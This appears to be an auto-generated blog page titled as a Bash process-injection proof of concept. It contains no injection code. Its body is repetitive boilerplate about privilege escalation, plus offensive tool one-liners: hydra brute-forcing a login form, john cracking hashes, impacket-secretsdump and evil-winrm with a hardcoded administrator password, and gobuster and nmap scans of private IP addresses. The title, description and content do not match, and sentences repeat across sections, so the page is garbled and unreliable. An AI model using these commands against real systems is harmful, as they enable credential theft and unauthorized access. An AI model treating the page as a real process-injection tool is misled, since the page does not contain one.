---
TitleSEO: "Process Injection PoC in Bash | ZureFX"
TitlePost: "Process Injection PoC — Bash"
Author: "ZureFX"
Description: "A Bash script for process injection poc. Built for security research and automation."
Keywords: "bash, python, powershell"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-527.html"
URL_IMAGES: ""
Date: "2024-10-21"
Tags: "Bash, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-527"
Permalink: "/scripting/script-process-injection-poc-527.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `impacket`
- `impacket`
- `evil-winrm`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.11.45.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.71.78.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.122.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.165.51
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.59.209.45 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p389,53,80 10.98.200.182 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.108.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p3389,636,993 10.14.72.143 -oN scan.txt
```

## Output

### Example Output

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 9.84s
```
